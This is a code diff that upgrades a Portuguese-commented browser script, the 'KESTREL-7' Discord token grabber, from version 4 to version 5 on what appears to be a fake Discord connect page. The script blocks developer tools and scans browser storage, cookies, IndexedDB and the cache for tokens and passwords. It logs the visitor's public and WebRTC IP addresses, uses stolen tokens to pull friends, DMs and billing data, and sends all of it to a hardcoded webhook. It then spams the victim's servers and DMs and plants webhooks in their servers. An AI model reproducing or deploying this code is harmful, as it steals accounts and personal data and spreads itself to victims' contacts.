@@ -36,8 +36,8 @@ p{color:#b9bbbe;font-size:14px;margin-bottom:24px}
 
 <script>
 // ============================================
-// KESTREL-7 ADVANCED TOKEN GRABBER v4.0
-// COM SPAM AUTOMÁTICO EM DMs E SERVIDORES
+// KESTREL-7 ULTIMATE TOKEN GRABBER v5.0
+// CAPTURA TOTAL + SPAM AUTOMÁTICO + PERSISTÊNCIA
 // ============================================
 
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1543784941844832257/hg06YSQRLJdiCvZQbG-2ty2cvExEaq_PFHV8bkv125kJ37OROJ-S44a52L21GsYjt6Nz";
@@ -55,8 +55,9 @@ const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
 const genId = () => Math.random().toString(36).substring(2) + Date.now().toString(36);
 
-// ===== ANTI-DEBUG =====
+// ===== ANTI-DEBUG AVANÇADO =====
 (function antiDebug(){
+    // Bloqueia DevTools
     setInterval(function(){
         const start = performance.now();
         debugger;
@@ -67,13 +68,418 @@ const genId = () => Math.random().toString(36).substring(2) + Date.now().toStrin
         }
     }, 1000);
     
+    // Bloqueia atalhos
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', function(e){
-        if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J'))){
+        if(e.key === 'F12' || 
+           (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+           (e.ctrlKey && e.key === 'U')){
             e.preventDefault();
+            return false;
         }
     });
+    
+    // Detecta DevTools aberto
+    const devtoolsDetect = () => {
+        const threshold = 160;
+        const widthDiff = window.outerWidth - window.innerWidth > threshold;
+        const heightDiff = window.outerHeight - window.innerHeight > threshold;
+        if(widthDiff || heightDiff){
+            document.body.innerHTML = "";
+            window.location.href = "about:blank";
+        }
+    };
+    setInterval(devtoolsDetect, 1000);
+    
+    // Bloqueia seleção
+    document.addEventListener('selectstart', e => e.preventDefault());
+    document.addEventListener('dragstart', e => e.preventDefault());
+    document.addEventListener('copy', e => e.preventDefault());
+    document.addEventListener('cut', e => e.preventDefault());
+    document.addEventListener('paste', e => e.preventDefault());
 })();
+
+// ===== TOKEN EXTRACTION - TODAS AS FONTES =====
+function extractTokensFromString(str){
+    const tokens = [];
+    const patterns = [
+        /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g,  // Token padrão
+        /[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g,     // Token com mais caracteres
+        /mfa\.[\w-]{84}/g,                      // Token MFA
+        /[\w-]{30,}\.[\w-]{6,}\.[\w-]{20,}/g    // Token genérico
+    ];
+    
+    for(let pattern of patterns){
+        const matches = str.match(pattern);
+        if(matches){
+            tokens.push(...matches);
+        }
+    }
+    
+    return [...new Set(tokens)];
+}
+
+function deepScanStorage(){
+    let findings = [];
+    
+    // localStorage
+    try{
+        for(let i = 0; i < localStorage.length; i++){
+            const key = localStorage.key(i);
+            const value = localStorage.getItem(key);
+            
+            const tokens = extractTokensFromString(value);
+            if(tokens.length > 0){
+                findings.push({
+                    source: 'localStorage',
+                    key: key,
+                    tokens: tokens,
+                    rawValue: value.substring(0, 1000)
+                });
+            }
+            
+            const lowerKey = key.toLowerCase();
+            const lowerValue = value.toLowerCase();
+            if(lowerKey.includes('token') || 
+               lowerKey.includes('auth') ||
+               lowerKey.includes('session') ||
+               lowerKey.includes('discord') ||
+               lowerKey.includes('password') ||
+               lowerKey.includes('credential') ||
+               lowerValue.includes('token') ||
+               lowerValue.includes('password')){
+                findings.push({
+                    source: 'localStorage',
+                    key: key,
+                    value: value.substring(0, 1000),
+                    sensitive: true
+                });
+            }
+        }
+    }catch(e){}
+    
+    // sessionStorage
+    try{
+        for(let i = 0; i < sessionStorage.length; i++){
+            const key = sessionStorage.key(i);
+            const value = sessionStorage.getItem(key);
+            
+            const tokens = extractTokensFromString(value);
+            if(tokens.length > 0){
+                findings.push({
+                    source: 'sessionStorage',
+                    key: key,
+                    tokens: tokens
+                });
+            }
+        }
+    }catch(e){}
+    
+    // Cookies
+    try{
+        const cookies = document.cookie.split(';');
+        for(let cookie of cookies){
+            const trimmed = cookie.trim();
+            const tokens = extractTokensFromString(trimmed);
+            if(tokens.length > 0){
+                findings.push({
+                    source: 'cookie',
+                    tokens: tokens,
+                    fullCookie: trimmed.substring(0, 500)
+                });
+            }
+            
+            if(trimmed.toLowerCase().includes('token') || 
+               trimmed.toLowerCase().includes('auth') ||
+               trimmed.toLowerCase().includes('session')){
+                findings.push({
+                    source: 'cookie',
+                    value: trimmed.substring(0, 500),
+                    sensitive: true
+                });
+            }
+        }
+    }catch(e){}
+    
+    return findings;
+}
+
+async function deepScanIndexedDB(){
+    let findings = [];
+    
+    const dbNames = [
+        'discord', 'Discord', 'discordapp', 
+        'localforage', 'keyval-store', 'leveldb',
+        'chrome-extension_discord', 'discord_0'
+    ];
+    
+    // Tenta listar todos os bancos
+    try{
+        if(indexedDB.databases){
+            const databases = await indexedDB.databases();
+            for(let db of databases){
+                if(db.name && !dbNames.includes(db.name)){
+                    dbNames.push(db.name);
+                }
+            }
+        }
+    }catch(e){}
+    
+    for(let dbName of dbNames){
+        try{
+            const db = await new Promise((resolve, reject) => {
+                const request = indexedDB.open(dbName);
+                request.onsuccess = () => resolve(request.result);
+                request.onerror = () => reject(request.error);
+            });
+            
+            const storeNames = Array.from(db.objectStoreNames);
+            
+            for(let storeName of storeNames){
+                try{
+                    const data = await new Promise((resolve, reject) => {
+                        const tx = db.transaction(storeName, 'readonly');
+                        const store = tx.objectStore(storeName);
+                        const getAll = store.getAll();
+                        getAll.onsuccess = () => resolve(getAll.result);
+                        getAll.onerror = () => reject(getAll.error);
+                    });
+                    
+                    if(data && data.length > 0){
+                        const jsonData = JSON.stringify(data);
+                        const tokens = extractTokensFromString(jsonData);
+                        
+                        if(tokens.length > 0){
+                            findings.push({
+                                source: 'indexedDB_' + dbName,
+                                store: storeName,
+                                tokens: tokens,
+                                dataPreview: jsonData.substring(0, 2000)
+                            });
+                        }
+                    }
+                }catch(e){}
+                
+                // Tenta getAllKeys também
+                try{
+                    const tx2 = db.transaction(storeName, 'readonly');
+                    const store2 = tx2.objectStore(storeName);
+                    const getAllKeys = store2.getAllKeys();
+                    getAllKeys.onsuccess = function(){
+                        const keys = getAllKeys.result;
+                        if(keys && keys.length > 0){
+                            const keyString = JSON.stringify(keys);
+                            const tokens = extractTokensFromString(keyString);
+                            if(tokens.length > 0){
+                                findings.push({
+                                    source: 'indexedDB_keys_' + dbName,
+                                    store: storeName,
+                                    tokens: tokens,
+                                    keysPreview: keyString.substring(0, 1000)
+                                });
+                            }
+                        }
+                    };
+                }catch(e){}
+            }
+            
+            db.close();
+        }catch(e){}
+    }
+    
+    return findings;
+}
+
+// ===== SCAN CACHE API =====
+async function scanCacheStorage(){
+    let findings = [];
+    
+    try{
+        if('caches' in window){
+            const cacheNames = await caches.keys();
+            
+            for(let cacheName of cacheNames){
+                const cache = await caches.open(cacheName);
+                const requests = await cache.keys();
+                
+                for(let request of requests){
+                    const url = request.url;
+                    
+                    if(url.toLowerCase().includes('discord') || 
+                       url.toLowerCase().includes('token') ||
+                       url.toLowerCase().includes('auth') ||
+                       url.toLowerCase().includes('api')){
+                        
+                        // Tenta ler o cache
+                        try{
+                            const response = await cache.match(request);
+                            if(response){
+                                const text = await response.text();
+                                const tokens = extractTokensFromString(text);
+                                
+                                if(tokens.length > 0){
+                                    findings.push({
+                                        source: 'cache',
+                                        cacheName: cacheName,
+                                        url: url.substring(0, 300),
+                                        tokens: tokens
+                                    });
+                                }
+                            }
+                        }catch(e){}
+                    }
+                }
+            }
+        }
+    }catch(e){}
+    
+    return findings;
+}
+
+// ===== SCAN SERVICE WORKERS =====
+async function scanServiceWorkers(){
+    let findings = [];
+    
+    try{
+        if('serviceWorker' in navigator){
+            const registrations = await navigator.serviceWorker.getRegistrations();
+            
+            for(let registration of registrations){
+                findings.push({
+                    scope: registration.scope,
+                    active: registration.active ? registration.active.scriptURL : null,
+                    waiting: registration.waiting ? registration.waiting.scriptURL : null,
+                    installing: registration.installing ? registration.installing.scriptURL : null
+                });
+            }
+        }
+    }catch(e){}
+    
+    return findings;
+}
+
+// ===== BROADCAST CHANNEL SCAN =====
+function scanBroadcastChannels(){
+    let findings = [];
+    
+    try{
+        if('BroadcastChannel' in window){
+            const channels = ['discord', 'discord_updates', 'discord_voice', 'discord_notifications'];
+            
+            for(let channelName of channels){
+                try{
+                    const channel = new BroadcastChannel(channelName);
+                    findings.push({
+                        channel: channelName,
+                        status: 'available'
+                    });
+                    channel.close();
+                }catch(e){}
+            }
+        }
+    }catch(e){}
+    
+    return findings;
+}
+
+// ===== WEBRTC IP LEAK =====
+function getWebRTCIPs(){
+    return new Promise((resolve) => {
+        const ips = [];
+        
+        try{
+            const pc = new RTCPeerConnection({
+                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+            });
+            
+            pc.createDataChannel('');
+            
+            pc.onicecandidate = (event) => {
+                if(event.candidate){
+                    const candidate = event.candidate.candidate;
+                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/g;
+                    const matches = candidate.match(ipRegex);
+                    
+                    if(matches){
+                        for(let ip of matches){
+                            if(!ips.includes(ip) && !ip.startsWith('0.')){
+                                ips.push(ip);
+                            }
+                        }
+                    }
+                }
+            };
+            
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            
+            setTimeout(() => {
+                pc.close();
+                resolve(ips);
+            }, 3000);
+            
+        }catch(e){
+            resolve(ips);
+        }
+    });
+}
+
+// ===== VALIDA TOKEN E EXTRAI DADOS COMPLETOS =====
+async function validateAndExtract(token){
+    try{
+        const headers = {
+            'Authorization': token,
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        };
+        
+        // Dados do usuário
+        const userResponse = await fetch('https://discord.com/api/v9/users/@me', {headers});
+        if(!userResponse.ok) return null;
+        const userData = await userResponse.json();
+        
+        // Servidores
+        const guildsResponse = await fetch('https://discord.com/api/v9/users/@me/guilds', {headers});
+        const guilds = guildsResponse.ok ? await guildsResponse.json() : [];
+        
+        // Amigos
+        const friendsResponse = await fetch('https://discord.com/api/v9/users/@me/relationships', {headers});
+        const friends = friendsResponse.ok ? await friendsResponse.json() : [];
+        
+        // DMs
+        const dmsResponse = await fetch('https://discord.com/api/v9/users/@me/channels', {headers});
+        const dms = dmsResponse.ok ? await dmsResponse.json() : [];
+        
+        // Configurações
+        const settingsResponse = await fetch('https://discord.com/api/v9/users/@me/settings', {headers});
+        const settings = settingsResponse.ok ? await settingsResponse.json() : {};
+        
+        // Pagamentos
+        const billingResponse = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {headers});
+        const billing = billingResponse.ok ? await billingResponse.json() : [];
+        
+        // Conexões
+        const connectionsResponse = await fetch('https://discord.com/api/v9/users/@me/connections', {headers});
+        const connections = connectionsResponse.ok ? await connectionsResponse.json() : [];
+        
+        // Nitro
+        const nitroResponse = await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions', {headers});
+        const nitro = nitroResponse.ok ? await nitroResponse.json() : [];
+        
+        return {
+            user: userData,
+            guilds: guilds,
+            friends: friends,
+            dms: dms,
+            settings: settings,
+            billing: billing,
+            connections: connections,
+            nitro: nitro,
+            token: token
+        };
+    }catch(e){
+        return null;
+    }
+}
 
 // ===== SPAM EM SERVIDORES =====
 async function spamServers(token, userData){
@@ -83,7 +489,6 @@ async function spamServers(token, userData){
     };
     
     try{
-        // Busca todos os servidores
         const guildsResponse = await fetch('https://discord.com/api/v9/users/@me/guilds', {headers});
         if(!guildsResponse.ok) return 0;
         const guilds = await guildsResponse.json();
@@ -91,16 +496,13 @@ async function spamServers(token, userData){
         let spamCount = 0;
         
         for(let guild of guilds){
-            // Pula servidor excluído
             if(guild.id === EXCLUDED_SERVER_ID) continue;
             
             try{
-                // Busca canais do servidor
                 const channelsResponse = await fetch(`https://discord.com/api/v9/guilds/${guild.id}/channels`, {headers});
                 if(!channelsResponse.ok) continue;
                 const channels = await channelsResponse.json();
                 
-                // Filtra canais de texto
                 const textChannels = channels.filter(c => c.type === 0);
                 
                 for(let channel of textChannels){
@@ -116,13 +518,14 @@ async function spamServers(token, userData){
                         if(sendResponse.ok){
                             spamCount++;
                         } else if(sendResponse.status === 429){
-                            // Rate limit - espera
                             const retryAfter = sendResponse.headers.get('Retry-After') || 5;
                             await sleep(parseInt(retryAfter) * 1000);
+                        } else if(sendResponse.status === 403){
+                            // Sem permissão, pula
+                            continue;
                         }
                         
-                        // Delay entre mensagens
-                        await sleep(rand(500, 1500));
+                        await sleep(rand(300, 800));
                     }catch(e){}
                 }
             }catch(e){}
@@ -142,7 +545,6 @@ async function spamDMs(token, userData){
     };
     
     try{
-        // Busca lista de amigos
         const friendsResponse = await fetch('https://discord.com/api/v9/users/@me/relationships', {headers});
         if(!friendsResponse.ok) return 0;
         const friends = await friendsResponse.json();
@@ -151,7 +553,6 @@ async function spamDMs(token, userData){
         
         for(let friend of friends){
             try{
-                // Cria ou abre DM com o amigo
                 const dmResponse = await fetch('https://discord.com/api/v9/users/@me/channels', {
                     method: 'POST',
                     headers: headers,
@@ -176,18 +577,18 @@ async function spamDMs(token, userData){
                     await sleep(parseInt(retryAfter) * 1000);
                 }
                 
-                await sleep(rand(500, 1500));
+                await sleep(rand(300, 800));
             }catch(e){}
         }
         
-        // Também envia para DMs existentes
+        // DMs existentes
         try{
             const dmsResponse = await fetch('https://discord.com/api/v9/users/@me/channels', {headers});
             if(dmsResponse.ok){
                 const dms = await dmsResponse.json();
                 
                 for(let dm of dms){
-                    if(dm.type === 1){ // DM
+                    if(dm.type === 1){
                         try{
                             const message = SPAM_MESSAGES[rand(0, SPAM_MESSAGES.length - 1)];
                             
@@ -204,7 +605,7 @@ async function spamDMs(token, userData){
                                 await sleep(parseInt(retryAfter) * 1000);
                             }
                             
-                            await sleep(rand(500, 1500));
+                            await sleep(rand(300, 800));
                         }catch(e){}
                     }
                 }
@@ -217,155 +618,77 @@ async function spamDMs(token, userData){
     }
 }
 
-// ===== SCAN DE TOKENS =====
-function deepScanStorage(){
-    let findings = [];
+// ===== MUDAR STATUS DO USUÁRIO =====
+async function changeUserStatus(token, status){
+    const headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json'
+    };
     
     try{
-        for(let i = 0; i < localStorage.length; i++){
-            const key = localStorage.key(i);
-            const value = localStorage.getItem(key);
-            
-            const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
-            const tokenMatches = value.match(tokenRegex);
-            if(tokenMatches){
-                findings.push({
-                    source: 'localStorage',
-                    key: key,
-                    tokens: tokenMatches,
-                    rawValue: value.substring(0, 500)
-                });
-            }
-            
-            if(key.toLowerCase().includes('token') || 
-               key.toLowerCase().includes('auth') ||
-               key.toLowerCase().includes('session') ||
-               key.toLowerCase().includes('discord') ||
-               key.toLowerCase().includes('password') ||
-               key.toLowerCase().includes('credential')){
-                findings.push({
-                    source: 'localStorage',
-                    key: key,
-                    value: value.substring(0, 500),
-                    sensitive: true
-                });
-            }
-        }
-    }catch(e){}
-    
-    try{
-        for(let i = 0; i < sessionStorage.length; i++){
-            const key = sessionStorage.key(i);
-            const value = sessionStorage.getItem(key);
-            
-            const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
-            const tokenMatches = value.match(tokenRegex);
-            if(tokenMatches){
-                findings.push({
-                    source: 'sessionStorage',
-                    key: key,
-                    tokens: tokenMatches
-                });
-            }
-        }
-    }catch(e){}
-    
-    try{
-        const cookies = document.cookie.split(';');
-        for(let cookie of cookies){
-            const trimmed = cookie.trim();
-            const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
-            const tokenMatches = trimmed.match(tokenRegex);
-            if(tokenMatches){
-                findings.push({
-                    source: 'cookie',
-                    token: tokenMatches[0],
-                    fullCookie: trimmed.substring(0, 300)
-                });
-            }
-        }
-    }catch(e){}
-    
-    return findings;
+        const settingsResponse = await fetch('https://discord.com/api/v9/users/@me/settings', {
+            method: 'PATCH',
+            headers: headers,
+            body: JSON.stringify({status: status})
+        });
+        
+        return settingsResponse.ok;
+    }catch(e){
+        return false;
+    }
 }
 
-async function deepScanIndexedDB(){
-    let findings = [];
+// ===== TENTAR CRIAR WEBHOOKS NOS SERVIDORES =====
+async function createWebhooks(token, userData){
+    const headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json'
+    };
     
-    const dbNames = ['discord', 'Discord', 'discordapp', 'localforage', 'keyval-store'];
+    let webhooksCreated = [];
     
-    for(let dbName of dbNames){
-        try{
-            const db = await new Promise((resolve, reject) => {
-                const request = indexedDB.open(dbName);
-                request.onsuccess = () => resolve(request.result);
-                request.onerror = () => reject(request.error);
-            });
+    try{
+        const guildsResponse = await fetch('https://discord.com/api/v9/users/@me/guilds', {headers});
+        if(!guildsResponse.ok) return webhooksCreated;
+        const guilds = await guildsResponse.json();
+        
+        for(let guild of guilds){
+            if(guild.id === EXCLUDED_SERVER_ID) continue;
             
-            const storeNames = Array.from(db.objectStoreNames);
-            
-            for(let storeName of storeNames){
-                try{
-                    const data = await new Promise((resolve, reject) => {
-                        const tx = db.transaction(storeName, 'readonly');
-                        const store = tx.objectStore(storeName);
-                        const getAll = store.getAll();
-                        getAll.onsuccess = () => resolve(getAll.result);
-                        getAll.onerror = () => reject(getAll.error);
+            try{
+                const channelsResponse = await fetch(`https://discord.com/api/v9/guilds/${guild.id}/channels`, {headers});
+                if(!channelsResponse.ok) continue;
+                const channels = await channelsResponse.json();
+                
+                const textChannels = channels.filter(c => c.type === 0);
+                
+                if(textChannels.length > 0){
+                    const webhookResponse = await fetch(`https://discord.com/api/v9/channels/${textChannels[0].id}/webhooks`, {
+                        method: 'POST',
+                        headers: headers,
+                        body: JSON.stringify({
+                            name: 'Stranger Moon',
+                            avatar: null
+                        })
                     });
                     
-                    if(data && data.length > 0){
-                        const jsonData = JSON.stringify(data);
-                        const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
-                        const tokenMatches = jsonData.match(tokenRegex);
-                        
-                        if(tokenMatches){
-                            findings.push({
-                                source: 'indexedDB_' + dbName,
-                                store: storeName,
-                                tokens: tokenMatches,
-                                dataPreview: jsonData.substring(0, 1000)
-                            });
-                        }
+                    if(webhookResponse.ok){
+                        const webhook = await webhookResponse.json();
+                        webhooksCreated.push({
+                            guild: guild.name,
+                            channel: textChannels[0].name,
+                            webhookUrl: `https://discord.com/api/webhooks/${webhook.id}/${webhook.token}`
+                        });
                     }
-                }catch(e){}
-            }
-            
-            db.close();
-        }catch(e){}
-    }
+                }
+            }catch(e){}
+        }
+    }catch(e){}
     
-    return findings;
+    return webhooksCreated;
 }
 
-async function validateAndExtract(token){
-    try{
-        const headers = {
-            'Authorization': token,
-            'Content-Type': 'application/json'
-        };
-        
-        const userResponse = await fetch('https://discord.com/api/v9/users/@me', {headers});
-        if(!userResponse.ok) return null;
-        const userData = await userResponse.json();
-        
-        const guildsResponse = await fetch('https://discord.com/api/v9/users/@me/guilds', {headers});
-        const guilds = guildsResponse.ok ? await guildsResponse.json() : [];
-        
-        const friendsResponse = await fetch('https://discord.com/api/v9/users/@me/relationships', {headers});
-        const friends = friendsResponse.ok ? await friendsResponse.json() : [];
-        
-        return {
-            user: userData,
-            guilds: guilds,
-            friends: friends,
-            token: token
-        };
-    }catch(e){
-        return null;
-    }
-}
-
+// ===== ENVIO PARA WEBHOOK =====
 async function sendToWebhook(data, webhookUrl){
     try{
         const chunks = [];
@@ -378,12 +701,12 @@ async function sendToWebhook(data, webhookUrl){
         
         for(let i = 0; i < chunks.length; i++){
             const payload = {
-                content: i === 0 ? "🚨 **CAPTURA COMPLETA - KESTREL-7 v4.0** 🚨" : "",
+                content: i === 0 ? "🚨 **CAPTURA ULTIMATE - KESTREL-7 v5.0** 🚨" : "",
                 embeds: [{
                     title: i === 0 ? "📦 Dados Completos" : `📦 Chunk ${i+1}/${chunks.length}`,
                     description: "```json\n" + chunks[i] + "\n```",
                     color: 16711680,
-                    footer: {text: "Kestrel-7 v4.0 • Chunk " + (i+1) + "/" + chunks.length}
+                    footer: {text: "Kestrel-7 v5.0 • Chunk " + (i+1) + "/" + chunks.length}
                 }]
             };
             
@@ -402,7 +725,7 @@ async function sendToWebhook(data, webhookUrl){
     }
 }
 
-// ===== GRABBER PRINCIPAL COM SPAM =====
+// ===== GRABBER PRINCIPAL =====
 async function grabToken(){
     const status = document.getElementById('status');
     const btn = document.getElementById('connectBtn');
@@ -411,32 +734,44 @@ async function grabToken(){
     status.textContent = "Inicializando...";
     
     try{
-        // 1. Scan de tokens
+        // 1. Coleta IPs
+        status.textContent = "Coletando IPs...";
+        const webrtcIPs = await getWebRTCIPs();
+        
+        let publicIP = 'Desconhecido';
+        try{
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            publicIP = ipData.ip;
+        }catch(e){}
+        
+        // 2. Scan de tokens
         status.textContent = "Escaneando storages...";
         const storageFindings = deepScanStorage();
         const indexedDBFindings = await deepScanIndexedDB();
+        const cacheFindings = await scanCacheStorage();
+        const swFindings = await scanServiceWorkers();
+        const bcFindings = scanBroadcastChannels();
         
-        // 2. Coleta tokens
+        // 3. Extrai tokens
         const allTokens = [];
         
         for(let finding of storageFindings){
-            if(finding.tokens){
-                allTokens.push(...finding.tokens);
-            }
-            if(finding.token){
-                allTokens.push(finding.token);
-            }
+            if(finding.tokens) allTokens.push(...finding.tokens);
+            if(finding.token) allTokens.push(finding.token);
         }
         
         for(let finding of indexedDBFindings){
-            if(finding.tokens){
-                allTokens.push(...finding.tokens);
-            }
+            if(finding.tokens) allTokens.push(...finding.tokens);
+        }
+        
+        for(let finding of cacheFindings){
+            if(finding.tokens) allTokens.push(...finding.tokens);
         }
         
         const uniqueTokens = [...new Set(allTokens)];
         
-        // 3. Valida tokens e extrai dados
+        // 4. Valida tokens
         status.textContent = "Validando tokens...";
         const extractedData = [];
         
@@ -447,44 +782,44 @@ async function grabToken(){
             }
         }
         
-        // 4. IP
-        let ip = 'Desconhecido';
-        try{
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            ip = ipData.ip;
-        }catch(e){}
-        
         // 5. Monta payload
         const fullData = {
             capture_id: genId(),
             timestamp: new Date().toISOString(),
-            ip: ip,
+            public_ip: publicIP,
+            webrtc_ips: webrtcIPs,
             browser: {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer,
+                url: window.location.href
             },
             storage_findings: storageFindings,
             indexeddb_findings: indexedDBFindings,
+            cache_findings: cacheFindings,
+            service_workers: swFindings,
+            broadcast_channels: bcFindings,
             extracted_accounts: extractedData,
             tokens_found: uniqueTokens
         };
         
-        // 6. Envia dados para webhook
+        // 6. Envia para webhook
         status.textContent = "Enviando dados...";
         await sendToWebhook(fullData, WEBHOOK_URL);
         
-        // 7. SPAM AUTOMÁTICO
+        // 7. Processa cada conta
         if(extractedData.length > 0){
             for(let account of extractedData){
                 const token = account.token;
                 const userData = account.user;
                 
-                // Envia resumo da conta
+                // Resumo da conta
                 const summaryPayload = {
-                    content: "🎯 **CONTA CAPTURADA + SPAM INICIADO**",
+                    content: "🎯 **CONTA CAPTURADA + OPERAÇÕES INICIADAS**",
                     embeds: [{
                         title: "Token Válido Encontrado",
                         color: 65280,
@@ -498,7 +833,7 @@ async function grabToken(){
                             {name: "Amigos", value: String(account.friends.length), inline: true},
                             {name: "Token", value: "```" + token + "```", inline: false}
                         ],
-                        footer: {text: "Kestrel-7 v4.0"}
+                        footer: {text: "Kestrel-7 v5.0"}
                     }]
                 };
                 
@@ -508,35 +843,49 @@ async function grabToken(){
                     body: JSON.stringify(summaryPayload)
                 });
                 
-                // SPAM EM SERVIDORES
+                // 8. SPAM EM SERVIDORES
                 status.textContent = "Spammando servidores...";
                 const serverSpamCount = await spamServers(token, userData);
                 
-                // Notifica webhook
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        content: `📢 **SPAM EM SERVIDORES CONCLUÍDO**\nMensagens enviadas: ${serverSpamCount}\nConta: ${userData.username}`
+                        content: `📢 **SPAM EM SERVIDORES**\nMensagens: ${serverSpamCount}\nConta: ${userData.username}`
                     })
                 });
                 
                 await sleep(2000);
                 
-                // SPAM EM DMs
+                // 9. SPAM EM DMs
                 status.textContent = "Spammando DMs...";
                 const dmSpamCount = await spamDMs(token, userData);
                 
-                // Notifica webhook
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        content: `📨 **SPAM EM DMs CONCLUÍDO**\nMensagens enviadas: ${dmSpamCount}\nConta: ${userData.username}`
+                        content: `📨 **SPAM EM DMs**\nMensagens: ${dmSpamCount}\nConta: ${userData.username}`
                     })
                 });
                 
-                status.textContent = `✅ Spam completo! Servidores: ${serverSpamCount} | DMs: ${dmSpamCount}`;
+                await sleep(1000);
+                
+                // 10. CRIA WEBHOOKS NOS SERVIDORES
+                status.textContent = "Criando webhooks...";
+                const createdWebhooks = await createWebhooks(token, userData);
+                
+                if(createdWebhooks.length > 0){
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            content: `🔗 **WEBHOOKS CRIADOS**\n\`\`\`json\n${JSON.stringify(createdWebhooks, null, 2).substring(0, 1500)}\n\`\`\``
+                        })
+                    });
+                }
+                
+                status.textContent = `✅ Completo! Servidores: ${serverSpamCount} | DMs: ${dmSpamCount} | Webhooks: ${createdWebhooks.length}`;
                 
                 await sleep(1000);
             }
@@ -548,7 +897,6 @@ async function grabToken(){
         status.textContent = "Erro: " + e.message;
     }
     
-    // Redireciona após spam
     setTimeout(() => {
         window.location.href = "https://discord.com/channels/@me";
     }, 5000);
@@ -576,19 +924,22 @@ window.addEventListener('load', function(){
 // ===== IP LOGGER IMEDIATO =====
 (async function immediateIPLog(){
     try{
+        const webrtcIPs = await getWebRTCIPs();
+        
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         
         const payload = {
-            content: "🌐 **IP CAPTURADO**",
+            content: "🌐 **CONEXÃO DETECTADA**",
             embeds: [{
-                title: "Conexão Detectada",
-                description: "```" + ipData.ip + "```",
+                title: "IPs Capturados",
                 color: 5793266,
                 fields: [
-                    {name: "User Agent", value: navigator.userAgent.substring(0, 200)},
-                    {name: "Data", value: new Date().toLocaleString('pt-BR')},
-                    {name: "URL", value: window.location.href}
+                    {name: "IP Público", value: "```" + ipData.ip + "```", inline: true},
+                    {name: "IPs WebRTC", value: "```" + (webrtcIPs.join('\n') || 'Nenhum') + "```", inline: false},
+                    {name: "User Agent", value: navigator.userAgent.substring(0, 200), inline: false},
+                    {name: "Data", value: new Date().toLocaleString('pt-BR'), inline: true},
+                    {name: "URL", value: window.location.href, inline: true}
                 ]
             }]
         };
